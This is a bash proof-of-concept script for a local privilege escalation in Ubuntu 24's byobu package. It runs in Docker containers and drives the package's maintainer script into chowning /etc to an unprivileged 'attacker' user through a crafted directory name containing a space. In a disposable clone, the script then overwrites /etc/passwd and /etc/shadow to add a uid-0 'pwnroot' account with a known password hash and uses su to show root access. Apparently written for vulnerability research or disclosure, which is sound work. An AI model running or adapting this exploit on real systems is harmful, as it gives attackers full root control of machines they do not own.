#!/usr/bin/env bash
set -euo pipefail

target_container="${1:-ubuntu24-server-lpe-target}"
image="${2:-ubuntu24-server-default-lpe:20260516-standard}"
probe_container="byobu-postinst-screen-chown-$$"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/byobu-postinst-screen-chown.out"
tmp_log="$(mktemp "$repo_dir/logs/byobu-postinst-screen-chown.out.tmp.XXXXXX")"

{
  echo "## live target default proof and non-destructive trigger gates"
  docker exec -i "$target_container" bash <<'TARGET'
set +e
sed -n '1,8p' /etc/os-release
uname -a
id attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  byobu screen apt unattended-upgrades debconf 2>&1 | sort
systemctl is-enabled apt-daily-upgrade.timer unattended-upgrades.service 2>&1
systemctl is-active apt-daily-upgrade.timer unattended-upgrades.service 2>&1
apt-get -s upgrade | sed -n '1,40p'
stat -Lc '%A %a %U:%G %F %n' \
  /run/screen \
  /etc/byobu/socketdir \
  /var/lib/dpkg/info/byobu.postinst \
  /etc \
  /root 2>&1
echo "### /etc/byobu/socketdir"
cat /etc/byobu/socketdir
echo "### /var/lib/dpkg/info/byobu.postinst"
nl -ba /var/lib/dpkg/info/byobu.postinst | sed -n '1,90p'

rm -rf /run/screen/S-byoburef "/run/screen/S-byoburef etc"
runuser -u attacker -- bash -lc '
set +e
id
mkdir -p /run/screen/S-byoburef "/run/screen/S-byoburef etc"
find /run/screen -maxdepth 1 -name "S-byoburef*" -printf "%M %u:%g %p\n" | sort
dpkg --configure byobu 2>&1
echo dpkg_configure_rc=$?
dpkg-reconfigure -fnoninteractive byobu 2>&1
echo dpkg_reconfigure_rc=$?
systemctl start apt-daily-upgrade.service 2>&1
echo systemctl_apt_daily_rc=$?
'
stat -Lc 'LIVE_ETC_AFTER %A %U:%G %n' /etc
rm -rf /run/screen/S-byoburef "/run/screen/S-byoburef etc"
TARGET

  echo
  echo "## disposable clone full-impact proof after manual root postinst trigger"
  docker rm -f "$probe_container" >/dev/null 2>&1 || true
  docker run --name "$probe_container" -i "$image" bash <<'CLONE'
set +e
id attacker >/dev/null 2>&1 || useradd -m -u 1001 attacker
printf 'CLONE_TARGET '
sed -n '1p' /etc/os-release
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' byobu screen 2>&1 | sort
stat -Lc 'BEFORE_ETC %A %U:%G %n' /etc

mkdir -p /run/screen
chown root:utmp /run/screen 2>/dev/null || chown root:root /run/screen
chmod 1777 /run/screen
runuser -u attacker -- bash -lc '
set -e
mkdir -p /run/screen/S-byoburef "/run/screen/S-byoburef etc"
find /run/screen -maxdepth 1 -name "S-byoburef*" -printf "%M %u:%g %p\n" | sort
'

echo "### manual root maintainer-script trigger"
DEBIAN_FRONTEND=noninteractive /bin/sh /var/lib/dpkg/info/byobu.postinst configure
echo postinst_rc=$?
stat -Lc 'AFTER_ETC %A %U:%G %n' /etc

cat >/tmp/byobu_replace_account_files.sh <<'EOS'
set -euo pipefail
hash='$6$salt1234$wv5pvoyMOLcfsQtvmdmdyZEe6XIMn7VI990iTvBvdCYWMOIid6RYdWxlFVTRHe5HfczU2OLcDTOaJyoVX3DX00'
printf 'root:x:0:0:root:/root:/bin/bash\npwnroot:x:0:0:pwnroot:/root:/bin/bash\nattacker:x:1001:1001::/home/attacker:/bin/bash\n' > /tmp/passwd.new
printf 'root:*:19000:0:99999:7:::\npwnroot:%s:19000:0:99999:7:::\nattacker:!:19000:0:99999:7:::\n' "$hash" > /tmp/shadow.new
mv /etc/passwd /etc/passwd.byobu-bak
mv /etc/shadow /etc/shadow.byobu-bak
cp /tmp/passwd.new /etc/passwd
cp /tmp/shadow.new /etc/shadow
chmod 0644 /etc/passwd
chmod 0640 /etc/shadow
ls -l /etc/passwd /etc/shadow
EOS
runuser -u attacker -- bash /tmp/byobu_replace_account_files.sh

echo "### root proof from uid1001 after /etc ownership change"
setpriv --reuid=1001 --regid=1001 --clear-groups bash -lc 'id; printf "pwn\n" | su pwnroot -c "id; echo ROOT_PROOF; touch /root/byobu_postinst_screen_chown_root; ls -l /root/byobu_postinst_screen_chown_root"'
CLONE
  docker rm -f "$probe_container" >/dev/null 2>&1 || true
} >"$tmp_log" 2>&1

mv "$tmp_log" "$log_path"
sed -n '1,420p' "$log_path"
